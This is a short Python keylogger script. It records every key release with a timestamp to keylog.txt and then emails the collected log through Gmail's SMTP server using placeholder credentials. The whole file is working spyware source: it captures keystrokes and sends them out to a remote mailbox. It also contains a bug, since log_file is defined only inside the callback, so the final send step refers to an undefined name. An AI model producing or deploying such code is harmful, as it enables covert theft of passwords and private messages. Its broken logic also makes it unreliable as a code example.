import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

# Email configuration
sender_email = "your_email@gmail.com"
receiver_email = "destination_email@gmail.com"
password = "your_email_password"

# Function to send email
def send_email(subject, body):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, password)
        text = msg.as_string()
        server.sendmail(sender_email, receiver_email, text)
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print("Error:", e)

# Function to log keystrokes
def on_key_event(event):
    log_file = "keylog.txt"
    with open(log_file, "a") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] - {event.name}\n")

# Hook keyboard events
keyboard.on_release(on_key_event)

# Monitor keyboard until user interrupts (Ctrl+C)
try:
    print("Keylogger is running. Press Ctrl+C to stop.")
    keyboard.wait()
except KeyboardInterrupt:
    print("Keylogger stopped.")

# Send the log file via email
with open(log_file, "r") as f:
    log_content = f.read()
    send_email("Keylogger Report", log_content)
